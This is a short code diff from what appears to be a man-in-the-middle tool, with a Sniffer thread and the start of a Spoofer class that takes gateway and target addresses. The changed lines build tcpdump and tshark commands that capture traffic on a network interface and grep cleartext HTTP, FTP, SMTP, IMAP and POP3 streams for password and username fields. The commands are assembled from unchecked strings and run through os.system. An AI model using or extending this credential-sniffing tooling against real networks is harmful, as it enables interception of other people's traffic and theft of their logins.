@@ -36,7 +36,7 @@ class Sniffer(Thread):
             arg = "sudo tshark -i "+self.interface+" -f 'dst port 53 or port 80' -Y 'eth.src!="+my_mac+"' -T ps > "+self.output
             os.system(arg)
         if self.type == "password":
-            arg = "sudo tcpdump port http or port ftp or port smtp or port imap or port pop3 -l -A -i "+self.interface+"| egrep -i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user ' --color=auto --line-buffered -B20 > "+self.output
+            arg = "sudo tcpdump port http or port ftp or port smtp or port imap or port pop3 -l -A -v -i "+self.interface+"| egrep -i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user ' --color=auto --line-buffered -B20 > "+self.output
             os.system(arg)
 class Spoofer(Thread):
     def __init__(self, gateway_ip, target_ip, my_mac, interface):
